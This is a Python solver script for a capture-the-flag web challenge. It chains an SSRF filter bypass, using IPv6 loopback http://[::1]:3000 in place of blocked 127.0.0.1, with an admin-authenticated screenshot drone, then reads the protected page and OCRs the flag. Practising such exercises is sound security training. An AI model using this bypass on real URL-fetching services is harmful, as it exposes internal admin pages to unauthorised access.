#!/usr/bin/env python3
"""
SiteCheck — SunshineCTF 2026 (web, 500 pts) — solver

Chain:
  1. Register an inspector account.
  2. Abuse /scan (SSRF): the filter blocks 127.0.0.1/localhost/IPv4 tricks but
     not IPv6 loopback -> http://[::1]/ passes.
  3. The drone's browser is pre-authenticated as admin and the real app runs
     on [::1]:3000 -> make it visit http://[::1]:3000/profile#clearance and
     screenshot the CLASSIFIED tab.
  4. OCR the screenshot (or save it) -> flag.

Usage:  python3 solver.py [base_url]
Deps:   requests, pytesseract + tesseract (optional, for auto-OCR)
"""

import re
import sys
import time
import uuid

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1
        else "https://spaceship.web.2026.sunshinectf.games").rstrip("/")

DRONE = "http://[::1]:3000"          # real app, reachable via IPv6-loopback SSRF
FLAG_RE = re.compile(r"sun\{[^}\s]+\}")

s = requests.Session()


def register():
    creds = {"username": f"inspector-{uuid.uuid4().hex[:8]}",
             "password": uuid.uuid4().hex,
             "viewport": "1440x900"}
    r = s.post(f"{BASE}/register", data=creds, allow_redirects=False, timeout=30)
    if r.status_code not in (302, 303):
        raise RuntimeError(f"register failed: HTTP {r.status_code}")
    print(f"[+] registered {creds['username']}")


def scan(url):
    """Submit a URL to the drone; poll the result page; return (html, shot_url)."""
    r = s.post(f"{BASE}/scan", data={"url": url}, allow_redirects=False, timeout=30)
    m = re.search(r"/result/[a-f0-9-]+", r.text + r.headers.get("Location", ""))
    if not m:
        return None, None                              # blocked by the filter
    loc = m.group(0)
    for _ in range(30):
        time.sleep(1)
        html = s.get(f"{BASE}{loc}", timeout=30).text
        if 'class="v">—' not in html and ("Status" in html or "Drone note" in html):
            shot = re.search(r"/screenshots/[a-f0-9-]+\.png", html)
            return html, (BASE + shot.group(0) if shot else None)
    raise TimeoutError(f"scan never finished for {url}")


def ocr(png_path):
    try:
        import pytesseract
        from PIL import Image
    except ImportError:
        return None
    return pytesseract.image_to_string(Image.open(png_path))


def main():
    register()

    # sanity: IPv4 loopback must be blocked, IPv6 loopback must pass
    assert scan("http://127.0.0.1/")[0] is None, "filter unexpectedly allows 127.0.0.1"
    print("[+] 127.0.0.1 blocked by filter, as expected")

    html, _ = scan(DRONE + "/")
    assert html and 'class="v">200' in html, "SSRF to [::1]:3000 failed"
    print("[+] SSRF via http://[::1]:3000/ -> HTTP 200 (drone is admin)")

    html, shot = scan(DRONE + "/profile#clearance")
    assert shot, "no screenshot captured"
    png = s.get(shot, timeout=30).content
    path = "clearance.png"
    with open(path, "wb") as f:
        f.write(png)
    print(f"[+] saved classified snapshot -> {path}")

    flag = FLAG_RE.search(ocr(path) or "")
    if flag:
        print(f"[+] FLAG: {flag.group(0)}")
    else:
        print(f"[!] OCR unavailable/unclear — read the flag from {path}")


if __name__ == "__main__":
    main()
